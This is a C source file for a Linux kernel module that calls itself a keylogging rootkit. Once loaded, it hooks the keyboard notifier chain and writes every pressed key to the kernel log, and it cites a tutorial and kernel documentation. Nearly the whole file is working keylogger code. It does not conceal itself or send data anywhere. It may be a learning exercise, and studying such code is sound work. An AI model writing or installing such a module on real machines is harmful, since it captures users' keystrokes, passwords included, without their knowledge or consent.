// Linux Rootkit for keylogging
// General keylogger structure:
// https://medium.com/@emanuele.santini.88/developing-a-linux-kernel-module-keylogger-6c3922d72f9d

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/keyboard.h>

// kernel documentation for keyboard notifier and registering notifiers
// https://elixir.bootlin.com/linux/v6.10.10/source/include/linux/keyboard.h#L19

// Callback function
int keyboard_callback(struct notifier_block *nb, unsigned long action, void *data) {
	// Cast the data to keyboard_notifier_param
	struct keyboard_notifier_param *param = data;

	// check if the key is pressed down
	if(action == KBD_KEYSYM && param->down) {
		printk(KERN_INFO "Keypressed: %c", param->value);
	}
	return NOTIFY_OK;	
}

// Define keylogger callback funcptr
// This is the parameter passed when registering callback function
// Documentation for callback function signatures 
// https://elixir.bootlin.com/linux/v6.10.10/source/include/linux/notifier.h#L234
static struct notifier_block nblock = {
	// set callback function
	.notifier_call = keyboard_callback
};

// LKM init function
static int __init startup(void) {
	register_keyboard_notifier(&nblock);
	printk(KERN_NOTICE "Keylogger LKM has been loaded\n");
	return 0;
}

// LKM exit function
static void __exit shutdown(void) {
	unregister_keyboard_notifier(&nblock);
	printk(KERN_NOTICE "Keylogger LKM has been removed\n");
}

// Set the init and exit functions
module_init(startup);
module_exit(shutdown);

// License information is requried?
MODULE_LICENSE("GPL");
